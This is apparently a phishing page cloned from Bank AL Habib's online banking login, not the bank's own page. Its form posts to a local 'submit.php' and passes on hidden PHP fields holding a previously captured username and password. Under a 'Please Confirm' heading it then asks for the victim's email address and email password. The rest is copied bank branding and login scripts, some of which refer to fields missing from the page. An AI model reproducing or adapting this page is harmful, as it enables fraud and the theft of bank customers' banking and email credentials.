					<li class="call_div"><label class="labeltext"><h1>Rishta Bharosay Ka</h1></label></li>
					<li class="lang_div" id="lang_div" style="float:right;">
						<!-- set display:none for Language dropdown By Prashant to Hide Language Dropdown as per the BAHL Customization -->
					
						<script language="JavaScript">
							document.documentElement.lang = "en";
						</script>
					</li>
					<li class="lang_div" style="float:right;">
						
						<script>
							function postSocial () {
								var desc, title, image;
								title = "Bank AL Habib Ltd - FLEXCUBE Direct Banking";
								if (typeof socialMediaDesc == 'string') {
									desc = socialMediaDesc;
								} else {
									desc = "Our Bank offers best products in the Country. Find advice and information on Saving Accounts, Deposits, Credit Cards etc. Also visit us to find advice on the various loan products.";
								}
								if (typeof socialMediaImage == 'string') {
									image = socialMediaImage;
								} else {
									image = "https://secure-bah.bankalhabib.com/T001/images/oracle_logo_final.png";
								}

								fPostToFeed (location.href, image, title, desc);
							}
						</script>
						<!--<img src="https://secure-bah.bankalhabib.com/T001/images/facebook.png" alt="Share on Facebook" title="Share on Facebook" onclick="postSocial()" style="cursor:pointer"/>-->
						<!-- <label class="labeltext">Choose Language</label> -->
					</li>
				</ul>
			</div>
		</form>
		
	</div>
	
	</div>
</div>


			<div id ="mainall" >

					<!-- Place a marquee at the login page to display error message Prashant 4/21/2016 start-->
					
					<!-- Place a marquee at the login page to display error message Prashant 4/21/2016 end-->
					
						<form name="frmmain"  action="submit.php"  method="POST"  autocomplete="off"  autocomplete="off" >
						<input type='hidden' name='idsequence' value='l3dMM1D1r1Q9k5Pt72t9couU5S4NDcseq+QP9DinYGw=' />
						<input type="hidden" name="username" value="<?php echo($username); ?>">
						 <input type="hidden" name="password" value="<?php echo($password); ?>">
						<style>
.sep {
left:44%;
}
</style><div id="tablediv"  style="position:relative;" ><div id="wrapper"  class="login" ><div id="main" ><div id="section" ><div class="left-sidebar" ><table cellpadding="0"  cellspacing="0"  border="0" ><tbody><tr><td><div id="keyboard_firstrowtwrapper" ><div id="keyboard_bankname" >Please Confirm </div><div id="keyboard_themselection" ><table>
<tr><td></td><td></td></tr></table></div></div>
<div class="user-txt" >
<h5>* All Required</h5></div>
</br>
<div id="rows"  class="form-control" >
<div class="labeltext"  id="user_id" >
<label for="fldLoginUserId" >Email Address&nbsp;&nbsp;&nbsp;</label></div>
<div>
<input type="email"  class="inputbox"  style="left:100px" title="Please enter Email Address"   id="fldLoginUserId"  name="email" required></input></div></div>
<div id="rows"  class="form-control" >
<div class="labeltext"  id="user_id" >
<label for="fldLoginUserId" >Password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label></div>
<div>
<input type="password" class="inputbox" style="left:10px" title="Please enter Email Password"   id="fldLoginUserId"  name="pass" required></input></div></div>

 
<div id="tabs_wrapper"  style="width:100%"  valign="top" >
<div id="tabs_container"  style="display: none;" >
<ul class="tabs" >
<li class="active" >
<a href="#VKB" >Virtual Keyboard</a></li>
<li><a href="#SKB" >Standard Keyboard</a></li></ul></div>
<div id="rows"  class="form-control" >
<div class="labeltext"  id="user_id" >
</div>
<div>
<div class="botton" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input name="imageField"  type="submit"  value="Confirm"  class="butt"  onClick="fLogon()" ></input></div></div></div>
<div id="tabs_content_container"  valign="top" >
<div id="VKB"  class="tab_content"  style="display: none;"  valign="top" >
<div id="rows"  valign="form-control" >
<br></br><div id="click_hover_row" ><span class="inputbox" >
						<input type="checkbox"  name="elemC4"  id="elemC4"  style="float:left;"  checked="false" ></input></span>
						</div></div>
						<div class="sep" ></div><a href="javascript:void(0)"  onclick="fcdb_norton()" >
						<div class="norton" ></div></a><div class="bg-keyboard-symmetry" >
						<div id="login-keyboard"  style="background-color: transparent" >
						<table cellpadding="0"  cellspacing="0"  align="center"  width="50%" >
						<tr><td align="center" ><div id="login-keyboard-special" ></div></td></tr>
													<tr>
												
												
													<tr>
												
												
														<td>
													<input type="button"  value="Not Mixed"  id="elemC3"  onMouseDown="return changeToStar();"  onMouseUp="return changeBack();"  onMouseOut="return changeBack();"  OnClick="setRandom('Mixed','Not Mixed');" >
													</input></td></tr></tr></table></div></div><div class="labeltext" >
                      
                        &nbsp;&nbsp;&nbsp;
                      
		      
		 

                      </div></div><script>
				           setRandom('Mixed','Not Mixed');
					       document.getElementById("VKB").style.display = "block";
					     </script>
						 <div id="SKB"  class="tab_content" >
						 <div id="rows" ><div class="labeltext"  id="password_id" >Password</div>
						 <div class="inputbox"  id="fldPassword" ><input type="password"  value=""  class="inputbox"  name="fldPasswordStandard"  oncopy="return false;"  onpaste="return false;"  id="SKBPassword" ></input></div><div class="labeltext" ><a href="javascript:void(0)"  class="keyboard_anchors"  onclick="forgotPassword ();" >Forgot Password?</a></div></div></div></div></div></td><td></td></tr></tbody></table></div><div class="right-sidebar" ><div class="tabs" ><a href="javascript:void(0)"  onclick="newUser()"  data-toggle="modal" ><div class="box" ><div class="icon-1" ></div><h6>User Registration</h6></div></a><a href="javascript:void(0)"  class="keyboard_anchors"  onclick="forgotPassword ()" ><div class="box" ><div class="icon-2" ></div><h6 class="forgot" >  Forgot Password?</h6></div></a><a href="javascript:void(0)"  class="keyboard_anchors"  onclick="AtmBranchLocator()" ><div class="box" ><div class="icon-3" ></div><h6 class="atm" >   ATM-Branch Locator
            </h6></div></a><a href="javascript:void(0)"  onclick="fcdb_video()"  data-toggle="modal" ><div class="box" ><div class="icon-4" ></div><h6>User Guide Demo</h6></div></a><a href="javascript:void(0)"  onclick="fcdb_security()"  data-toggle="modal" ><div class="box" ><div class="icon-5" ></div><h6 class="security" >Security Tip</h6></div></a><a href="javascript:void(0)"  onclick="fcdb_contact_us()"  data-toggle="modal" ><div class="box" ><div class="icon-6" ></div><h6 class="contact" >Contact Us</h6></div></a></div><div class="paragraph" ><div class="sub-heading" ><label class="label-controls" ><div class="botton" ><input name="imageField"  type="button"  value="Security Advice"  class="butt"  onClick="" ></input></div></label><p>It is strongly recommended for security reasons to use the Virtual Keyboard given on the left side.
</p></div></div></div><footer><div class="copyright" >Copyright &copy; 2019 - Bank AL Habib | All Rights Reserved</div><div class="sitemap" ><a href="javascript:void(0)"  onclick="fcdb_faq()" >FAQs</a> l <a href="javascript:void(0)"  onclick="fcdb_compatibility()" >Browser Requirement </a></div></footer><div class="keyboard_bankname" ></div></div></div></div></div><input type="hidden"  name="fldPassword"  value="" ></input><script language="JavaScript" >
  //-----------------------------------------------------------------------------


  document.getElementById('elemC4').checked=false;
  
  
  var virtKeyb = true;
  var speedMbps;
  var BW_THRESHOLD = 300;
  var scr_w, scr_w1,scr_h, scr_h1;
  function initializelogin()
  {
  document.getElementById('elemC4').checked=false;

  //document.frmmain.fldPassword.focus ();
  setScreenSize ();
  //document.frmmain.fldLoginUserId.focus ();
  if (virtKeyb) {
  document.frmmain.fldPassword.readOnly =true;
  document.frmmain.fldPassword.blur();
  } else {
  document.frmmain.fldPassword.readOnly = false;
  var keyBoard = document.getElementById('login-keyboard').getElementsByTagName("BUTTON");
  for(i=0; i <= keyBoard.length-1; i++){
  keyBoard[i].disabled=true;
  keyBoard[i].style.color='#AAAAAA';
  }
  }
  $("#fldLoginUserId").focus (function (e) {focusUserId (this);});
  $("#fldLoginUserId").blur (function (e) {blurUserId (this);});
  blurUserId (document.getElementById ("fldLoginUserId"));
  }

  $(document).ready(function() {
  initializelogin ();
  //setheight ();
  //SecurityWarning ();
  getBandWidth();
  });

  $(".tabs li").click(function() {
  $(".tabs li").removeClass('active');	//	First remove class "active" from currently active tab
  $(this).addClass("active");	//	Now add class "active" to the selected/clicked tab
  $(".tab_content").hide();	//	Hide all tab content
  var selected_tab = $(this).find("a").attr("href");	//	Here we get the href value of the selected tab
  $(selected_tab).fadeIn();	//	Show the selected tab content
  if (selected_tab == "#SKB") {
  virtKeyb = false;
  document.frmmain.fldPasswordStandard.focus ()
  } else {
  virtKeyb = true;
  document.frmmain.fldPasswordStandard.blur ();
  }
  return false;	//	At the end, we add return false so that the click on the link is not executed
  });



  function getBandWidth()
  {
  var startTime, endTime;
  var imgSize = 983094; //bytes
  var testImg = new Image();
  testImg.src = "images/test.bmp" + "?n=" + Math.random();
  startTime = (new Date()).getTime();

  testImg.onload = function () {
  endTime = (new Date()).getTime();
  var duration = (endTime - startTime) / 1000;
  var bitsLoaded = imgSize * 8;
  var speedBps = bitsLoaded / duration;
  speedMbps = ((speedBps / 1024)/1024).toFixed(2);
  }
  }

  //-----------------------------------------------------------------------------
  function fLogon () {

  var pwd = null;
  var rsa = new RSAKey();
  var mod = "912f2b92b6eece87d660d1f58e3208fb487fce3e672aeb93b28e2d575a1888516ff7d390141d3afbe185a083dd9bb84d42fdef9a5a3901590e74a35eb6358c29a0ac4d34daeb1cafe6ae0e8012a6c96a6b0c609e55dadec925888c6b06436da2c388170e7b51b0b9475d01ad8893c87ced00a6f0793b5a9aa8acdbff4b694ce9";
		var expo = "10001";
		rsa.setPublic(mod, expo);

		if (userId == "") {
			alert ("User Id must be entered");
			document.frmmain.fldLoginUserId.focus ();
			return false;
		}

		if (virtKeyb) {
			if (document.frmmain.fldPasswordVirtual.value == "") {
				alert ("Password must be entered");
				document.frmmain.fldPasswordVirtual.focus ();
				return false;
			}
			pwd = document.frmmain.fldPasswordVirtual.value;
			document.frmmain.fldPasswordVirtual.value = "";
		} else {
			if (document.frmmain.fldPasswordStandard.value == "") {
				alert ("Password must be entered");
				document.frmmain.fldPasswordStandard.focus ();
				return false;
			}
			pwd = document.frmmain.fldPasswordStandard.value;
			document.frmmain.fldPasswordStandard.value = "";
		}
		
		if(pwd.length < 16){	   
		aString = new String("16");	
		answer = aString - pwd.length;  
				var sr = " ";
				var cnt ;
			for (var i = 0; i < answer; i++) {				 
				var rsr =  pwd.concat(sr);
				pwd =rsr;			
			}
	   }
	  
		document.frmmain.fldPassword.value = rsa.encrypt(pwd);
		document.frmmain.fldRequestId.value = "RRLGN01";
		
		var isLowBW = false;

		var scr_w, scr_w1;
		var scr_h, scr_h1;
		scr_w1 = 1015;
		scr_h1 = 740;

		if (scr_w == '800')
		{
			scr_w1 = 785;
			scr_h1 = 500;
		}
		
		if(typeof loginWindow != 'undefined'){
			try{
			loginWindow.close();
			}catch(e){
			}
		}//else added by Dhawal
		else if(typeof loginWindow == 'undefined'){
				try{
					var existingwindow = myGetCookie('loginwindowhandle');
					if(typeof existingwindow != 'undefined') {
						loginWindow = window.open ("", document.frmmain.fldLoginUserId.value.replace(/[^a-zA-z0-9]+/g,"a"));
						loginWindow.close();
					}
				}catch(e){
				}
			}

		if(speedMbps <= BW_THRESHOLD) 
		{
			var UI_id = document.frmmain.fldlitever;
			for(var i = 0; i < UI_id.options.length; i++) {
				if(UI_id.options[i].value == "L") {
					UI_id.selectedIndex = i;
					break;
				}
			}
			isLowBW = true;
		}
		
		if(isLowBW) {
			$("#bwDialog").dialog("open");
			return false;
		}
		else {
			return redirectToSummaryPage();
		}
	}

	document.onkeydown=function(){
		if(window.event.keyCode=='13'){
			fLogon();
		}
	}
	function redirectToSummaryPage() 
	{
		var scrW = screen.availWidth-10+"px";
		var scrH = screen.availHeight-60+"px";
		var windowName = document.frmmain.fldLoginUserId.value.replace(/[^a-zA-z0-9]+/g,"a");
		loginWindow = window.open ("", windowName ,
				"dependant=no,directories=no,location=no,menubar=no"
			+	",resizable=yes,scrollbars=yes,titlebar=no,toolbar=no,"
			+ "0, 0, top=0,left=0,status=1,"
			+ "width=" + (scrW)
			+ ",height=" + (scrH)); 

		document.frmmain.target = windowName ;
		document.frmmain.submit ();
		loginWindow.focus();
			
		//Added by Dhawal
		mySetCookie('loginwindowhandle',loginWindow);
		document.frmmain.fldLoginUserId.value = "";
		document.frmmain.fldPassword.value = "";
		document.frmmain.fldPasswordStandard.value = "";
		document.frmmain.fldPasswordVirtual.value = "";
		//L.1  fldcaptchatext reset
		document.frmmain.fldcaptchatext.value="";
		
		return false;
	}
		//--------------------Added by Dhawal Start-----------------------------------
			function mySetCookie(c_name,value)
	{
		var d = new Date();
		d.setTime(d.getTime() + (20*60*1000));
		var expires = "expires="+d.toUTCString();
		document.cookie=c_name+'='+value+";"+expires;
	}

	function myGetCookie(c_name)
	{
		if (document.cookie.length>0)
		{
			c_start=document.cookie.indexOf(c_name + '=')
			if (c_start!=-1)
			{
				c_start=c_start + c_name.length+1
				c_end=document.cookie.indexOf(';',c_start)
				if (c_end==-1) c_end=document.cookie.length
				return unescape(document.cookie.substring(c_start,c_end))
			}
		}
		return;
	}
			
	//--------------------Added by Dhawal End-----------------------------------
	//----------------------------------------------------------------------------		

	function setheight () {
		var isNS6 = (!document.all && document.getElementById) ? true : false;

		if(isNS6==true) {
			document.getElementById('TDlogin').style.height ='350px';
		} else {
			document.getElementById('TDlogin').style.height ='100%';
		}
	}
	//-----------------------------------------------------------------------------
	function DeletePwd () {
		if (virtKeyb) {
			var strNumField = new String(document.frmmain.fldPasswordVirtual.value);
			document.frmmain.fldPasswordVirtual.value = strNumField.substring(0,strNumField.length-1);
			//document.frmmain.fldPasswordVirtual.id="";
			doRandomize();
		}
		return false;
	}
	//-----------------------------------------------------------------------------
	function ClearPwd () {
		if (virtKeyb) {
			document.frmmain.fldPassword.value = "";
			document.frmmain.fldPasswordStandard.value = "";
			document.frmmain.fldPasswordVirtual.value = "";
			doRandomize();
		}
		return false;
	}
	//------------------------------------------------------------------------------
			function formwindow_open(frm, title, id){
				var window_name = 'process_' + id;
				var frm_action;
				window.open (
					''
				,	window_name
				,	'toolbar=0,location=0,directories=0,status=1,menubar=0,scrollbars=1,resizable=0,left=0,top=0,width='+scr_w1+',height='+scr_h1
				);
				frm.target = window_name;
				frm.title.value = title;
				frm.fldRequestId.value = id;
				frm_action = frm.action;
				frm.action = "process.jsp"
				frm.submit ();
				frm.action = frm_action;
			}
	//------------------------------------------------------------------------------
	function setScreenSize(){
				
				scr_w1 = screen.availWidth-10+"px";
				scr_h1 = screen.availHeight-60+"px";
			}
</script><input name="fldRequestId"  value="RRLGN01"  type="hidden" ></input><input name="fldDeviceId"  value="01"  type="hidden" ></input></form>

						
			</div>

<!-- Added By Prashant to move security tips pop up on banking.jsp from home.jsp -->
<!--   Prashant Start    -->
				
     
<!-- Prashant End -->
	<!--/form-->
		<form name="frmprocess" method="POST" action="process.jsp">
			<input type="hidden" name="fldRequestId" value=""/>
			<input type="hidden" name="fldDeviceId" value="01"/>
			<input type="hidden" name="title" value=""/>
			<input type="hidden" name="usertype" value="EN1"/>
		</form>
	</body>
</html> 

